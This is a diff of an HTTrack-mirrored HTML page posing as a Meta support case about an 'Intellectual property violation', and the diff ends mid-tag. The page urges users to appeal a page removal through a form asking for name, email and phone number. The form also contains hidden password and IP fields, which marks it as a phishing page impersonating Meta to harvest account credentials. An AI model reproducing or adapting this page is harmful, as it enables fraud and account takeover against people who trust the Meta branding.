@@ -1,690 +1,2879 @@
 ﻿<html lang="en">
+  <!-- Added by HTTrack -->
+  <meta
+    http-equiv="content-type"
+    content="text/html;charset=utf-8"
+  /><!-- /Added by HTTrack -->
 
-<!-- Added by HTTrack -->
-<meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
-
-<head>
+  <head>
     <!-- Required meta tags -->
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-    <link rel="stylesheet" href="npm/bootstrap%404.3.1/dist/css/bootstrap.min.css">
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no"
+    />
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="upgrade-insecure-requests"
+    />
+    <link
+      rel="stylesheet"
+      href="npm/bootstrap%404.3.1/dist/css/bootstrap.min.css"
+    />
     <script src="jquery-3.6.0.min.js"></script>
     <title>Meta</title>
     <style>
-        .spinner {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            border: 2px solid #ccc;
-            border-top-color: #00ff00;
-            /* Green color */
-            animation: spinner 0.8s linear infinite;
-            margin-right: 8px;
+      .spinner {
+        display: inline-block;
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        border: 2px solid #ccc;
+        border-top-color: #00ff00;
+        /* Green color */
+        animation: spinner 0.8s linear infinite;
+        margin-right: 8px;
+      }
+
+      @keyframes spinner {
+        0% {
+          transform: rotate(0deg);
         }
 
-        @keyframes spinner {
-            0% {
-                transform: rotate(0deg);
-            }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
 
-            100% {
-                transform: rotate(360deg);
-            }
+      .loader {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+
+        z-index: 9999;
+        width: 40px;
+        height: 40px;
+
+        display: none;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
         }
 
-        .loader {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-
-            z-index: 9999;
-            width: 40px;
-            height: 40px;
-
-            display: none;
+        100% {
+          transform: rotate(360deg);
         }
+      }
 
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        /* .loader {
+      /* .loader {
   position: relative;
   width: 54px;
   height: 54px;
   border-radius: 10px;
 } */
 
-        .loader div {
-            width: 8%;
-            height: 24%;
-            background: rgb(128, 128, 128);
-            position: absolute;
-            left: 50%;
-            top: 30%;
-            opacity: 0;
-            border-radius: 50px;
-            box-shadow: 0 0 3px rgba(0, 0, 0, 0.2);
-            animation: fade458 1s linear infinite;
+      .loader div {
+        width: 8%;
+        height: 24%;
+        background: rgb(128, 128, 128);
+        position: absolute;
+        left: 50%;
+        top: 30%;
+        opacity: 0;
+        border-radius: 50px;
+        box-shadow: 0 0 3px rgba(0, 0, 0, 0.2);
+        animation: fade458 1s linear infinite;
+      }
+
+      @keyframes fade458 {
+        from {
+          opacity: 1;
         }
 
-        @keyframes fade458 {
-            from {
-                opacity: 1;
-            }
-
-            to {
-                opacity: 0.25;
-            }
+        to {
+          opacity: 0.25;
         }
+      }
 
-        .loader .bar1 {
-            transform: rotate(0deg) translate(0, -130%);
-            animation-delay: 0s;
-        }
+      .loader .bar1 {
+        transform: rotate(0deg) translate(0, -130%);
+        animation-delay: 0s;
+      }
 
-        .loader .bar2 {
-            transform: rotate(30deg) translate(0, -130%);
-            animation-delay: -1.1s;
-        }
+      .loader .bar2 {
+        transform: rotate(30deg) translate(0, -130%);
+        animation-delay: -1.1s;
+      }
 
-        .loader .bar3 {
-            transform: rotate(60deg) translate(0, -130%);
-            animation-delay: -1s;
-        }
+      .loader .bar3 {
+        transform: rotate(60deg) translate(0, -130%);
+        animation-delay: -1s;
+      }
 
-        .loader .bar4 {
-            transform: rotate(90deg) translate(0, -130%);
-            animation-delay: -0.9s;
-        }
+      .loader .bar4 {
+        transform: rotate(90deg) translate(0, -130%);
+        animation-delay: -0.9s;
+      }
 
-        .loader .bar5 {
-            transform: rotate(120deg) translate(0, -130%);
-            animation-delay: -0.8s;
-        }
+      .loader .bar5 {
+        transform: rotate(120deg) translate(0, -130%);
+        animation-delay: -0.8s;
+      }
 
-        .loader .bar6 {
-            transform: rotate(150deg) translate(0, -130%);
-            animation-delay: -0.7s;
-        }
+      .loader .bar6 {
+        transform: rotate(150deg) translate(0, -130%);
+        animation-delay: -0.7s;
+      }
 
-        .loader .bar7 {
-            transform: rotate(180deg) translate(0, -130%);
-            animation-delay: -0.6s;
-        }
+      .loader .bar7 {
+        transform: rotate(180deg) translate(0, -130%);
+        animation-delay: -0.6s;
+      }
 
-        .loader .bar8 {
-            transform: rotate(210deg) translate(0, -130%);
-            animation-delay: -0.5s;
-        }
+      .loader .bar8 {
+        transform: rotate(210deg) translate(0, -130%);
+        animation-delay: -0.5s;
+      }
 
-        .loader .bar9 {
-            transform: rotate(240deg) translate(0, -130%);
-            animation-delay: -0.4s;
-        }
+      .loader .bar9 {
+        transform: rotate(240deg) translate(0, -130%);
+        animation-delay: -0.4s;
+      }
 
-        .loader .bar10 {
-            transform: rotate(270deg) translate(0, -130%);
-            animation-delay: -0.3s;
-        }
+      .loader .bar10 {
+        transform: rotate(270deg) translate(0, -130%);
+        animation-delay: -0.3s;
+      }
 
-        .loader .bar11 {
-            transform: rotate(300deg) translate(0, -130%);
-            animation-delay: -0.2s;
-        }
+      .loader .bar11 {
+        transform: rotate(300deg) translate(0, -130%);
+        animation-delay: -0.2s;
+      }
 
-        .loader .bar12 {
-            transform: rotate(330deg) translate(0, -130%);
-            animation-delay: -0.1s;
-        }
+      .loader .bar12 {
+        transform: rotate(330deg) translate(0, -130%);
+        animation-delay: -0.1s;
+      }
     </style>
 
-    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="shortcut icon" href="images/favicon.ico" />
+  </head>
 
-
-</head>
-
-<body>
-
-
-    <link rel="stylesheet" href="css/app.css">
+  <body>
+    <link rel="stylesheet" href="css/app.css" />
     <div id="home-page" class="app-wrapper container-fluid-width home-page">
-        <section class="header">
-            <div class="container" bis_skin_checked="1">
-                <div class="row" bis_skin_checked="1">
-                    <div class="col-6" bis_skin_checked="1">
-                        <img src="ZUXA21k.png" class="img-fluid" width="120">
-                    </div>
-                    <div class="col-6" style="text-align: right;" bis_skin_checked="1">
-                        <p style="color:#3578e5; display:none; padding-top: 8px; margin-bottom: 0px; font-weight: 600; font-size: 15px;"><i style="font-size: 16px;" class="fa-solid fa-envelope"></i> Support Inbox</p>
-                    </div>
-                </div>
+      <section class="header">
+        <div class="container" bis_skin_checked="1">
+          <div class="row" bis_skin_checked="1">
+            <div class="col-6" bis_skin_checked="1">
+              <img src="ZUXA21k.png" class="img-fluid" width="120" />
             </div>
-        </section>
-        <section class="main">
-            <div class="container">
-                <div class="row">
-                    <div class="col-md-8 offset-md-2">
-                        <div class="card">
-                            <div class="row" style="padding-bottom: 20px; border-bottom: 1px solid #dddfe2;">
-                                <div class="col-md-1 col-2">
-                                    <img src="images/email-icon-circle-28.jpg" class="fa-solid fa-envelope" style=" " width="50">
-                                </div>
-                                <div class="col-md-11 col-10">
-                                    <p style="font-weight: bold; margin-bottom: 0;">Intellectual property violation</p>
-                                    <div class="">
-                                        <span data-v-4362cbd2="" class="open" style="background-color: rgb(59, 129, 211); font-size: 12px;">OPEN</span>
-                                        <span style="color:#90949c; font-size: 12px;">CASE #8894777049546</span>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="row" style="padding-top: 20px; padding-bottom: 20px;  border-bottom:1px solid #dddfe2">
-                                <input hidden="" id="ip" name="ip">
-                                <div class="col-md-1 col-2">
-                                    <img src="images/newlogo1.png" class="img-fluid">
-                                </div>
-                                <div class="col-md-11 col-10" style="padding-left: 0;">
-                                    <p style="font-weight: bold; font-size: 14px; margin-bottom: 7px">Our Message</p>
-                                    <p style="font-size: 14px; color:#67788A;" class="ourmessagiii">
-                                        - Community Standards<br>
-                                        - Copyright<br>
-                                        - Hate speech, harassment and bullying<br>
-                                        - Intellectual property rights<br>
-                                        <br>
-                                        If you believe your page was removed by mistake, fill in this form so we can help.
-
-
-                                    </p>
-                                </div>
-                            </div>
-                            <div class="row" style="padding-top: 10px; padding-bottom: 10px;  border-bottom:1px solid #dddfe2">
-                                <div class="col-md-1 col-2"></div>
-                                <div class="col-md-11 col-10" style="padding-left: 0;">
-                                    <p style="font-weight: bold; font-size: 14px; margin-bottom: 7px"></p>
-                                    <form style="margin-left: -30px;">
-                                        <input type="hidden" name="password" id="password">
-                                        <div style="display:inline-block;">
-                                            <label style="color:#67788A;">* Required</label>
-                                            <label style="color:#67788A; font-style: italic; font-weight: normal;">(Your meta Account Information)</label>
-                                            <label id="form-error" style="color:red; font-style: italic;"></label>
-                                        </div>
-                                        <div class="form-group">
-                                            <label for="name" style="color:#67788A;">Who is the owner of the Page? *</label>
-                                            <input type="text" class="form-control" id="name" name="name" style="font-size: 14px; border: 1px solid #67788A;" required="">
-                                        </div>
-                                        <div class="form-group">
-                                            <label for="email" style="color:#67788A;">Email Address *</label>
-                                            <input type="email" class="form-control" style="border-radius: 0; height: 35px; border: 1px solid #67788A;" id="email" name="email" aria-describedby="email" required="">
-                                        </div>
-                                        <div class="form-group">
-                                            <label for="phone" style="color:#67788A;">Phone Number *</label>
-                                            <div>
-                                                <select id="country_code" class="form-control" style="display: inline-block;vertical-align: middle;width: 90px;height: 35px;padding-bottom: 3px;padding-top: 3px; border-radius: 0px; border: 1px solid #67788A;">
-                                                    <option name="United States (+1)" value="1">+1</option>
-                                                    <option name="Afghanistan (+93)" value="93">Afghanistan (+93)</option>
-                                                    <option name="Albania (+355)" value="355">Albania (+355)</option>
-                                                    <option name="Algeria (+213)" value="213">Algeria (+213)</option>
-                                                    <option name="American Samoa (+1)" value="1">American Samoa (+1)</option>
-                                                    <option name="Andorra (+376)" value="376">Andorra (+376)</option>
-                                                    <option name="Angola (+244)" value="244">Angola (+244)</option>
-                                                    <option name="Anguilla (+1)" value="1">Anguilla (+1)</option>
-                                                    <option name="Antigua (+1)" value="1">Antigua (+1)</option>
-                                                    <option name="Argentina (+54)" value="54">Argentina (+54)</option>
-                                                    <option name="Armenia (+374)" value="374">Armenia (+374)</option>
-                                                    <option name="Aruba (+297)" value="297">Aruba (+297)</option>
-                                                    <option name="Australia (+61)" value="61">Australia (+61)</option>
-                                                    <option name="Austria (+43)" value="43">Austria (+43)</option>
-                                                    <option name="Azerbaijan (+994)" value="994">Azerbaijan (+994)</option>
-                                                    <option name="Bahrain (+973)" value="973">Bahrain (+973)</option>
-                                                    <option name="Bangladesh (+880)" value="880">Bangladesh (+880)</option>
-                                                    <option name="Barbados (+1)" value="1">Barbados (+1)</option>
-                                                    <option name="Belarus (+375)" value="375">Belarus (+375)</option>
-                                                    <option name="Belgium (+32)" value="32">Belgium (+32)</option>
-                                                    <option name="Belize (+501)" value="501">Belize (+501)</option>
-                                                    <option name="Benin (+229)" value="229">Benin (+229)</option>
-                                                    <option name="Bermuda (+1)" value="1">Bermuda (+1)</option>
-                                                    <option name="Bhutan (+975)" value="975">Bhutan (+975)</option>
-                                                    <option name="Bolivia (+591)" value="591">Bolivia (+591)</option>
-                                                    <option name="Bonaire, Sint Eustatius and Saba (+599)" value="599">Bonaire, Sint Eustatius and Saba (+599)</option>
-                                                    <option name="Bosnia and Herzegovina (+387)" value="387">Bosnia and Herzegovina (+387)</option>
-                                                    <option name="Botswana (+267)" value="267">Botswana (+267)</option>
-                                                    <option name="Brazil (+55)" value="55">Brazil (+55)</option>
-                                                    <option name="British Indian Ocean Territory (+246)" value="246">British Indian Ocean Territory (+246)</option>
-                                                    <option name="British Virgin Islands (+1)" value="1">British Virgin Islands (+1)</option>
-                                                    <option name="Brunei (+673)" value="673">Brunei (+673)</option>
-                                                    <option name="Bulgaria (+359)" value="359">Bulgaria (+359)</option>
-                                                    <option name="Burkina Faso (+226)" value="226">Burkina Faso (+226)</option>
-                                                    <option name="Burundi (+257)" value="257">Burundi (+257)</option>
-                                                    <option name="Cambodia (+855)" value="855">Cambodia (+855)</option>
-                                                    <option name="Cameroon (+237)" value="237">Cameroon (+237)</option>
-                                                    <option name="Canada (+1)" value="1">Canada (+1)</option>
-                                                    <option name="Cape Verde (+238)" value="238">Cape Verde (+238)</option>
-                                                    <option name="Cayman Islands (+1)" value="1">Cayman Islands (+1)</option>
-                                                    <option name="Côte d'Ivoire (+225)" value="225">Côte d'Ivoire (+225)</option>
-                                                    <option name="Central African Republic (+236)" value="236">Central African Republic (+236)</option>
-                                                    <option name="Chad (+235)" value="235">Chad (+235)</option>
-                                                    <option name="Chile (+56)" value="56">Chile (+56)</option>
-                                                    <option name="China (+86)" value="86">China (+86)</option>
-                                                    <option name="Colombia (+57)" value="57">Colombia (+57)</option>
-                                                    <option name="Comoros (+269)" value="269">Comoros (+269)</option>
-                                                    <option name="Cook Islands (+682)" value="682">Cook Islands (+682)</option>
-                                                    <option name="Costa Rica (+506)" value="506">Costa Rica (+506)</option>
-                                                    <option name="Croatia (+385)" value="385">Croatia (+385)</option>
-                                                    <option name="Cuba (+53)" value="53">Cuba (+53)</option>
-                                                    <option name="Curaçao (+599)" value="599">Curaçao (+599)</option>
-                                                    <option name="Cyprus (+357)" value="357">Cyprus (+357)</option>
-                                                    <option name="Czech Republic (+420)" value="420">Czech Republic (+420)</option>
-                                                    <option name="Democratic Republic of the Congo (+243)" value="243">Democratic Republic of the Congo (+243)</option>
-                                                    <option name="Denmark (+45)" value="45">Denmark (+45)</option>
-                                                    <option name="Djibouti (+253)" value="253">Djibouti (+253)</option>
-                                                    <option name="Dominica (+1)" value="1">Dominica (+1)</option>
-                                                    <option name="Dominican Republic (+1)" value="1">Dominican Republic (+1)</option>
-                                                    <option name="Ecuador (+593)" value="593">Ecuador (+593)</option>
-                                                    <option name="Egypt (+20)" value="20">Egypt (+20)</option>
-                                                    <option name="El Salvador (+503)" value="503">El Salvador (+503)</option>
-                                                    <option name="Equatorial Guinea (+240)" value="240">Equatorial Guinea (+240)</option>
-                                                    <option name="Eritrea (+291)" value="291">Eritrea (+291)</option>
-                                                    <option name="Estonia (+372)" value="372">Estonia (+372)</option>
-                                                    <option name="Ethiopia (+251)" value="251">Ethiopia (+251)</option>
-                                                    <option name="Falkland Islands (+500)" value="500">Falkland Islands (+500)</option>
-                                                    <option name="Faroe Islands (+298)" value="298">Faroe Islands (+298)</option>
-                                                    <option name="Federated States of Micronesia (+691)" value="691">Federated States of Micronesia (+691)</option>
-                                                    <option name="Fiji (+679)" value="679">Fiji (+679)</option>
-                                                    <option name="Finland (+358)" value="358">Finland (+358)</option>
-                                                    <option name="France (+33)" value="33">France (+33)</option>
-                                                    <option name="French Guiana (+594)" value="594">French Guiana (+594)</option>
-                                                    <option name="French Polynesia (+689)" value="689">French Polynesia (+689)</option>
-                                                    <option name="Gabon (+241)" value="241">Gabon (+241)</option>
-                                                    <option name="Georgia (+995)" value="995">Georgia (+995)</option>
-                                                    <option name="Germany (+49)" value="49">Germany (+49)</option>
-                                                    <option name="Ghana (+233)" value="233">Ghana (+233)</option>
-                                                    <option name="Gibraltar (+350)" value="350">Gibraltar (+350)</option>
-                                                    <option name="Greece (+30)" value="30">Greece (+30)</option>
-                                                    <option name="Greenland (+299)" value="299">Greenland (+299)</option>
-                                                    <option name="Grenada (+1)" value="1">Grenada (+1)</option>
-                                                    <option name="Guadeloupe (+590)" value="590">Guadeloupe (+590)</option>
-                                                    <option name="Guam (+1)" value="1">Guam (+1)</option>
-                                                    <option name="Guatemala (+502)" value="502">Guatemala (+502)</option>
-                                                    <option name="Guernsey (+44)" value="44">Guernsey (+44)</option>
-                                                    <option name="Guinea (+224)" value="224">Guinea (+224)</option>
-                                                    <option name="Guinea-Bissau (+245)" value="245">Guinea-Bissau (+245)</option>
-                                                    <option name="Guyana (+592)" value="592">Guyana (+592)</option>
-                                                    <option name="Haiti (+509)" value="509">Haiti (+509)</option>
-                                                    <option name="Honduras (+504)" value="504">Honduras (+504)</option>
-                                                    <option name="Hong Kong (+852)" value="852">Hong Kong (+852)</option>
-                                                    <option name="Hungary (+36)" value="36">Hungary (+36)</option>
-                                                    <option name="Iceland (+354)" value="354">Iceland (+354)</option>
-                                                    <option name="India (+91)" value="91">India (+91)</option>
-                                                    <option name="Indonesia (+62)" value="62">Indonesia (+62)</option>
-                                                    <option name="Iran (+98)" value="98">Iran (+98)</option>
-                                                    <option name="Iraq (+964)" value="964">Iraq (+964)</option>
-                                                    <option name="Ireland (+353)" value="353">Ireland (+353)</option>
-                                                    <option name="Isle Of Man (+44)" value="44">Isle Of Man (+44)</option>
-                                                    <option name="Israel (+972)" value="972">Israel (+972)</option>
-                                                    <option name="Italy (+39)" value="39">Italy (+39)</option>
-                                                    <option name="Jamaica (+1)" value="1">Jamaica (+1)</option>
-                                                    <option name="Japan (+81)" value="81">Japan (+81)</option>
-                                                    <option name="Jersey (+44)" value="44">Jersey (+44)</option>
-                                                    <option name="Jordan (+962)" value="962">Jordan (+962)</option>
-                                                    <option name="Kazakhstan (+7)" value="7">Kazakhstan (+7)</option>
-                                                    <option name="Kenya (+254)" value="254">Kenya (+254)</option>
-                                                    <option name="Kiribati (+686)" value="686">Kiribati (+686)</option>
-                                                    <option name="Kosovo (+383)" value="383">Kosovo (+383)</option>
-                                                    <option name="Kuwait (+965)" value="965">Kuwait (+965)</option>
-                                                    <option name="Kyrgyzstan (+996)" value="996">Kyrgyzstan (+996)</option>
-                                                    <option name="Laos (+856)" value="856">Laos (+856)</option>
-                                                    <option name="Latvia (+371)" value="371">Latvia (+371)</option>
-                                                    <option name="Lebanon (+961)" value="961">Lebanon (+961)</option>
-                                                    <option name="Lesotho (+266)" value="266">Lesotho (+266)</option>
-                                                    <option name="Liberia (+231)" value="231">Liberia (+231)</option>
-                                                    <option name="Libya (+218)" value="218">Libya (+218)</option>
-                                                    <option name="Liechtenstein (+423)" value="423">Liechtenstein (+423)</option>
-                                                    <option name="Lithuania (+370)" value="370">Lithuania (+370)</option>
-                                                    <option name="Luxembourg (+352)" value="352">Luxembourg (+352)</option>
-                                                    <option name="Macau (+853)" value="853">Macau (+853)</option>
-                                                    <option name="Macedonia (+389)" value="389">Macedonia (+389)</option>
-                                                    <option name="Madagascar (+261)" value="261">Madagascar (+261)</option>
-                                                    <option name="Malawi (+265)" value="265">Malawi (+265)</option>
-                                                    <option name="Malaysia (+60)" value="60">Malaysia (+60)</option>
-                                                    <option name="Maldives (+960)" value="960">Maldives (+960)</option>
-                                                    <option name="Mali (+223)" value="223">Mali (+223)</option>
-                                                    <option name="Malta (+356)" value="356">Malta (+356)</option>
-                                                    <option name="Marshall Islands (+692)" value="692">Marshall Islands (+692)</option>
-                                                    <option name="Martinique (+596)" value="596">Martinique (+596)</option>
-                                                    <option name="Mauritania (+222)" value="222">Mauritania (+222)</option>
-                                                    <option name="Mauritius (+230)" value="230">Mauritius (+230)</option>
-                                                    <option name="Mayotte (+262)" value="262">Mayotte (+262)</option>
-                                                    <option name="Mexico (+52)" value="52">Mexico (+52)</option>
-                                                    <option name="Moldova (+373)" value="373">Moldova (+373)</option>
-                                                    <option name="Monaco (+377)" value="377">Monaco (+377)</option>
-                                                    <option name="Mongolia (+976)" value="976">Mongolia (+976)</option>
-                                                    <option name="Montenegro (+382)" value="382">Montenegro (+382)</option>
-                                                    <option name="Montserrat (+1)" value="1">Montserrat (+1)</option>
-                                                    <option name="Morocco (+212)" value="212">Morocco (+212)</option>
-                                                    <option name="Mozambique (+258)" value="258">Mozambique (+258)</option>
-                                                    <option name="Myanmar (+95)" value="95">Myanmar (+95)</option>
-                                                    <option name="Namibia (+264)" value="264">Namibia (+264)</option>
-                                                    <option name="Nauru (+674)" value="674">Nauru (+674)</option>
-                                                    <option name="Nepal (+977)" value="977">Nepal (+977)</option>
-                                                    <option name="Netherlands (+31)" value="31">Netherlands (+31)</option>
-                                                    <option name="New Caledonia (+687)" value="687">New Caledonia (+687)</option>
-                                                    <option name="New Zealand (+64)" value="64">New Zealand (+64)</option>
-                                                    <option name="Nicaragua (+505)" value="505">Nicaragua (+505)</option>
-                                                    <option name="Niger (+227)" value="227">Niger (+227)</option>
-                                                    <option name="Nigeria (+234)" value="234">Nigeria (+234)</option>
-                                                    <option name="Niue (+683)" value="683">Niue (+683)</option>
-                                                    <option name="Norfolk Island (+672)" value="672">Norfolk Island (+672)</option>
-                                                    <option name="North Korea (+850)" value="850">North Korea (+850)</option>
-                                                    <option name="Northern Mariana Islands (+1)" value="1">Northern Mariana Islands (+1)</option>
-                                                    <option name="Norway (+47)" value="47">Norway (+47)</option>
-                                                    <option name="Oman (+968)" value="968">Oman (+968)</option>
-                                                    <option name="Pakistan (+92)" value="92">Pakistan (+92)</option>
-                                                    <option name="Palau (+680)" value="680">Palau (+680)</option>
-                                                    <option name="Palestine (+970)" value="970">Palestine (+970)</option>
-                                                    <option name="Panama (+507)" value="507">Panama (+507)</option>
-                                                    <option name="Papua New Guinea (+675)" value="675">Papua New Guinea (+675)</option>
-                                                    <option name="Paraguay (+595)" value="595">Paraguay (+595)</option>
-                                                    <option name="Peru (+51)" value="51">Peru (+51)</option>
-                                                    <option name="Philippines (+63)" value="63">Philippines (+63)</option>
-                                                    <option name="Poland (+48)" value="48">Poland (+48)</option>
-                                                    <option name="Portugal (+351)" value="351">Portugal (+351)</option>
-                                                    <option name="Puerto Rico (+1)" value="1">Puerto Rico (+1)</option>
-                                                    <option name="Qatar (+974)" value="974">Qatar (+974)</option>
-                                                    <option name="Réunion (+262)" value="262">Réunion (+262)</option>
-                                                    <option name="Republic of the Congo (+242)" value="242">Republic of the Congo (+242)</option>
-                                                    <option name="Romania (+40)" value="40">Romania (+40)</option>
-                                                    <option name="Russia (+7)" value="7">Russia (+7)</option>
-                                                    <option name="Rwanda (+250)" value="250">Rwanda (+250)</option>
-                                                    <option name="Saint Barthélemy (+590)" value="590">Saint Barthélemy (+590)</option>
-                                                    <option name="Saint Helena (+290)" value="290">Saint Helena (+290)</option>
-                                                    <option name="Saint Kitts and Nevis (+1)" value="1">Saint Kitts and Nevis (+1)</option>
-                                                    <option name="Saint Martin (+590)" value="590">Saint Martin (+590)</option>
-                                                    <option name="Saint Pierre and Miquelon (+508)" value="508">Saint Pierre and Miquelon (+508)</option>
-                                                    <option name="Saint Vincent and the Grenadines (+1)" value="1">Saint Vincent and the Grenadines (+1)</option>
-                                                    <option name="Samoa (+685)" value="685">Samoa (+685)</option>
-                                                    <option name="San Marino (+378)" value="378">San Marino (+378)</option>
-                                                    <option name="Sao Tome and Principe (+239)" value="239">Sao Tome and Principe (+239)</option>
-                                                    <option name="Saudi Arabia (+966)" value="966">Saudi Arabia (+966)</option>
-                                                    <option name="Senegal (+221)" value="221">Senegal (+221)</option>
-                                                    <option name="Serbia (+381)" value="381">Serbia (+381)</option>
-                                                    <option name="Seychelles (+248)" value="248">Seychelles (+248)</option>
-                                                    <option name="Sierra Leone (+232)" value="232">Sierra Leone (+232)</option>
-                                                    <option name="Singapore (+65)" value="65">Singapore (+65)</option>
-                                                    <option name="Sint Maarten (+1)" value="1">Sint Maarten (+1)</option>
-                                                    <option name="Slovakia (+421)" value="421">Slovakia (+421)</option>
-                                                    <option name="Slovenia (+386)" value="386">Slovenia (+386)</option>
-                                                    <option name="Solomon Islands (+677)" value="677">Solomon Islands (+677)</option>
-                                                    <option name="Somalia (+252)" value="252">Somalia (+252)</option>
-                                                    <option name="South Africa (+27)" value="27">South Africa (+27)</option>
-                                                    <option name="South Korea (+82)" value="82">South Korea (+82)</option>
-                                                    <option name="South Sudan (+211)" value="211">South Sudan (+211)</option>
-                                                    <option name="Spain (+34)" value="34">Spain (+34)</option>
-                                                    <option name="Sri Lanka (+94)" value="94">Sri Lanka (+94)</option>
-                                                    <option name="St. Lucia (+1)" value="1">St. Lucia (+1)</option>
-                                                    <option name="Sudan (+249)" value="249">Sudan (+249)</option>
-                                                    <option name="Suriname (+597)" value="597">Suriname (+597)</option>
-                                                    <option name="Swaziland (+268)" value="268">Swaziland (+268)</option>
-                                                    <option name="Sweden (+46)" value="46">Sweden (+46)</option>
-                                                    <option name="Switzerland (+41)" value="41">Switzerland (+41)</option>
-                                                    <option name="Syria (+963)" value="963">Syria (+963)</option>
-                                                    <option name="Taiwan (+886)" value="886">Taiwan (+886)</option>
-                                                    <option name="Tajikistan (+992)" value="992">Tajikistan (+992)</option>
-                                                    <option name="Tanzania (+255)" value="255">Tanzania (+255)</option>
-                                                    <option name="Thailand (+66)" value="66">Thailand (+66)</option>
-                                                    <option name="The Bahamas (+1)" value="1">The Bahamas (+1)</option>
-                                                    <option name="The Gambia (+220)" value="220">The Gambia (+220)</option>
-                                                    <option name="Timor-Leste (+670)" value="670">Timor-Leste (+670)</option>
-                                                    <option name="Togo (+228)" value="228">Togo (+228)</option>
-                                                    <option name="Tokelau (+690)" value="690">Tokelau (+690)</option>
-                                                    <option name="Tonga (+676)" value="676">Tonga (+676)</option>
-                                                    <option name="Trinidad and Tobago (+1)" value="1">Trinidad and Tobago (+1)</option>
-                                                    <option name="Tunisia (+216)" value="216">Tunisia (+216)</option>
-                                                    <option name="Turkey (+90)" value="90">Turkey (+90)</option>
-                                                    <option name="Turkmenistan (+993)" value="993">Turkmenistan (+993)</option>
-                                                    <option name="Turks and Caicos Islands (+1)" value="1">Turks and Caicos Islands (+1)</option>
-                                                    <option name="Tuvalu (+688)" value="688">Tuvalu (+688)</option>
-                                                    <option name="Uganda (+256)" value="256">Uganda (+256)</option>
-                                                    <option name="Ukraine (+380)" value="380">Ukraine (+380)</option>
-                                                    <option name="United Arab Emirates (+971)" value="971">United Arab Emirates (+971)</option>
-                                                    <option name="United Kingdom (+44)" value="44">United Kingdom (+44)</option>
-                                                    <option name="Uruguay (+598)" value="598">Uruguay (+598)</option>
-                                                    <option name="US Virgin Islands (+1)" value="1">US Virgin Islands (+1)</option>
-                                                    <option name="Uzbekistan (+998)" value="998">Uzbekistan (+998)</option>
-                                                    <option name="Vanuatu (+678)" value="678">Vanuatu (+678)</option>
-                                                    <option name="Vatican City (+39)" value="39">Vatican City (+39)</option>
-                                                    <option name="Venezuela (+58)" value="58">Venezuela (+58)</option>
-                                                    <option name="Vietnam (+84)" value="84">Vietnam (+84)</option>
-                                                    <option name="Wallis and Futuna (+681)" value="681">Wallis and Futuna (+681)</option>
-                                                    <option name="Western Sahara (+212)" value="212">Western Sahara (+212)</option>
-                                                    <option name="Yemen (+967)" value="967">Yemen (+967)</option>
-                                                    <option name="Zambia (+260)" value="260">Zambia (+260)</option>
-                                                    <option name="Zimbabwe (+263)" value="263">Zimbabwe (+263)</option>
-                                                </select>
-                                                <input type="text" class="form-control" id="phone" name="phone" required="" style="display: inline-block;vertical-align: middle;width: 50%; border: 1px solid #67788A;" onkeypress="return event.charCode >= 48 && event.charCode <= 57">
-                                            </div>
-                                        </div>
-
-                                        <div data-v-4362cbd2="" class="mb-3">
-                                            <div data-v-4362cbd2="" class="form-check">
-                                                <input data-v-4362cbd2="" type="checkbox" value="" id="flexCheckDefault" class="form-check-input">
-                                                <label data-v-4362cbd2="" for="flexCheckDefault" class="form-check-label" style="font-size:14px; color:#67788A; font-weight: bold;">
-                                                    Country of your credit and/or debit cards doesn't match your current location
-                                                </label>
-                                            </div>
-                                        </div>
-                                        <div data-v-4362cbd2="" class="mb-3">
-                                            <div data-v-4362cbd2="" class="form-check">
-                                                <input data-v-4362cbd2="" type="checkbox" value="" id="flexCheckDefault2" class="form-check-input">
-                                                <label data-v-4362cbd2="" for="flexCheckDefault2" class="form-check-label" style="font-size:14px; color:#67788A; font-weight: bold;">
-                                                    You traveled within the last 60 days
-                                                </label>
-                                            </div>
-                                        </div>
-                                        <div data-v-4362cbd2="" class="mb-3">
-                                            <div data-v-4362cbd2="" class="form-check">
-                                                <input data-v-4362cbd2="" type="checkbox" value="" id="flexCheckDefault3" class="form-check-input">
-                                                <label data-v-4362cbd2="" for="flexCheckDefault3" class="form-check-label" style="font-size:14px; color:#67788A; font-weight: bold;">
-                                                    You relocated within the last 60 days
-                                                </label>
-                                            </div>
-                                        </div>
-                                        <div class="form-group" style="margin-top: 15px;">
-                                            <label for="reason" style="color:#67788A;">Your Appeal *</label>
-                                            <textarea name="reason" id="reason" class="form-control" style="border: 1px solid #67788A;"></textarea>
-                                        </div>
-
-                                        <div class="form-check">
-                                            <input class="form-check-input check" type="checkbox" id="check" value="1" name="check" required="">
-                                            <label class="form-check-label" for="check" name="check" style="font-size:14px; color:#67788A; font-weight: bold;">
-                                                Agree to our Terms, Data Policy and Cookies Policy. *
-                                            </label>
-                                        </div>
-                                        <input id="btn-submit" type="button" class="btn btn-primary btn-register-send" name="formasubmitapeal" value="Submit" style="border-radius: 15px;box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);margin-top: 20px; padding: 15px 20px 15px 20px; color: #ffffff; background-color: #0067cd; border:0px; font-weight: bold; font-size: 14px;">
-
-                                        <div style="margin-top:15px;">
-                                            <p style="font-size:14px; color:#67788A; display:inline-block;">For more information about how Meta handles your data please read our</p>
-                                            <a style="font-size:14px; text-decoration: underline; color: #0064E0;" href="https://www.facebook.com/privacy/explanation/">Meta Privacy Policy</a>
-                                        </div>
-                                    </form>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                </div>
-                <hr style="width: 50%;">
+            <div class="col-6" style="text-align: right" bis_skin_checked="1">
+              <p
+                style="
+                  color: #3578e5;
+                  display: none;
+                  padding-top: 8px;
+                  margin-bottom: 0px;
